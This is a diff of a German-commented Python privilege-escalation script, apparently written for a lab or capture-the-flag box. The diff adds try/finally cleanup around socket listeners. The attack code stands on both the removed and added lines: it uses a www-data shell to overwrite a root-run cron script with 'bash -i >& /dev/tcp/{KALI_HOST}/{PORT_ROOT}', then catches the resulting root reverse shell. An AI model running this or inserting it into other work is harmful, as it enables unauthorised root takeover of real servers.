@@ -38,26 +38,29 @@ def run(www_shell):
     root_server.listen(1)
     print(f"[*] Warte auf Root-Shell auf Port {PORT_ROOT}...")
 
-    # cleanup.sh mit Reverse-Shell-Payload überschreiben
-    # > überschreibt, >> hängt an
-    print("[*] Überschreibe cleanup.sh...")
-    send_command(www_shell, f"echo '#!/bin/bash' > {CLEANUP_SCRIPT}")
-    send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{KALI_HOST}/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
-    print("[+] cleanup.sh erfolgreich überschrieben")
-    print("[*] Warte auf Cron-Job (max. 60 Sekunden)...")
-
-    # Cron-Job läuft jede Minute → max. 70 Sekunden warten
-    root_server.settimeout(70)
-
     try:
-        root_shell, addr = root_server.accept()
-        print(f"[+] Root-Shell erhalten von {addr[0]}")
-    except socket.timeout:
-        print("[-] Timeout — keine Root-Shell erhalten")
-        print("    → Cron-Daemon läuft nicht: service cron status")
-        print("    → Cron-Job fehlt: cat /etc/cron.d/cleanup")
-        print("    → Dateirechte falsch: ls -la /opt/cleanup.sh")
-        return None
+        # cleanup.sh mit Reverse-Shell-Payload überschreiben
+        # > überschreibt, >> hängt an
+        print("[*] Überschreibe cleanup.sh...")
+        send_command(www_shell, f"echo '#!/bin/bash' > {CLEANUP_SCRIPT}")
+        send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{KALI_HOST}/{PORT_ROOT} 0>&1' >> {CLEANUP_SCRIPT}")
+        print("[+] cleanup.sh erfolgreich überschrieben")
+        print("[*] Warte auf Cron-Job (max. 60 Sekunden)...")
+
+        # Cron-Job läuft jede Minute → max. 70 Sekunden warten
+        root_server.settimeout(70)
+
+        try:
+            root_shell, addr = root_server.accept()
+            print(f"[+] Root-Shell erhalten von {addr[0]}")
+        except socket.timeout:
+            print("[-] Timeout — keine Root-Shell erhalten")
+            print("    → Cron-Daemon läuft nicht: service cron status")
+            print("    → Cron-Job fehlt: cat /etc/cron.d/cleanup")
+            print("    → Dateirechte falsch: ls -la /opt/cleanup.sh")
+            return None
+    finally:
+        root_server.close()
 
     # Root-Rechte bestätigen — lese in einer Schleife bis "uid=" erscheint
     # oder das Timeout abläuft (initiales Banner/Prompt wird so nicht übersprungen)
@@ -97,7 +100,10 @@ if __name__ == "__main__":
     test_server.bind(("0.0.0.0", 4444))
     test_server.listen(1)
 
-    www_shell, addr = test_server.accept()
-    print(f"[+] www-data Shell erhalten von {addr[0]}")
+    try:
+        www_shell, addr = test_server.accept()
+        print(f"[+] www-data Shell erhalten von {addr[0]}")
+    finally:
+        test_server.close()
 
     run(www_shell)
